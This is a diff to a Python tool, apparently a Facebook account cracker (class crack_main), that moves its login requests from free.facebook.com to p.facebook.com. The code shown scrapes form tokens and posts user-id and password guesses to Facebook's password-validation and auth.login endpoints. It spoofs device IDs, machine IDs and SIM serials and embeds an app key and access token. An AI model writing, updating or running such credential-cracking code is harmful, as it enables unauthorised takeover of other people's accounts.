@@ -282,7 +282,7 @@ class crack_main():
                 ps=xyz.get(gurl, headers=headers,allow_redirects=False, timeout=30)
                 cookis = (";").join([ "%s=%s" % (key, value) for key, value in ps.cookies.get_dict().items() ])
                 cookis+=' m_pixel_ratio=2.625; wd=412x756'
-                dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(ps.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(ps.text)).group(1),"uid":iid,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas}
+                dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(ps.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(ps.text)).group(1),"uid":iid,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas}
                 url=str('https://'+host+'/login/device-based/validate-password/?shbl=0')
                 po = xyz.post(url,headers=headers, data=dataa,cookies={'cookie': cookis}, allow_redirects=True, timeout=30)
                 get = (";").join([ "%s=%s" % (key, value) for key, value in po.cookies.get_dict().items() ])
@@ -309,7 +309,7 @@ class crack_main():
                 device_family_id = str(uuid.uuid4())
                 machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
                 sim = ''.join(random.choice(digits) for _ in range(20))
-                fb = xyz.get('https://free.facebook.com').text
+                fb = xyz.get('https://p.facebook.com').text
                 jazoest = re.search('name="jazoest" value="(.*?)"', str(fb)).group(1)
                 data = {'adid':adid,'format':'json','device_id':device_family_id,'email':iid,'password':pas,'generate_analytics_claim':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':device_family_id,'sim_serials':sim,'credentials_type':'device_based_login_password','generate_session_cookies':'1','error_detail_type':'button_with_disabled','source':'device_based_login','machine_id':machine_id,'login_latitude':geo[0],'login_longitude':geo[1],'login_location_accuracy_m':'1.0','jazoest':jazoest,'meta_inf_fbmeta':'','advertiser_id':adid,'encrypted_msisdn':'','currently_logged_in_userid':'0','locale':'en_US','client_country_code':geo[2],'method':'auth.login','fb_api_req_friendly_name':'authenticate','fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler','api_key':'882a8490361da98702bf97a021ddc14d','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
                 #print(data)
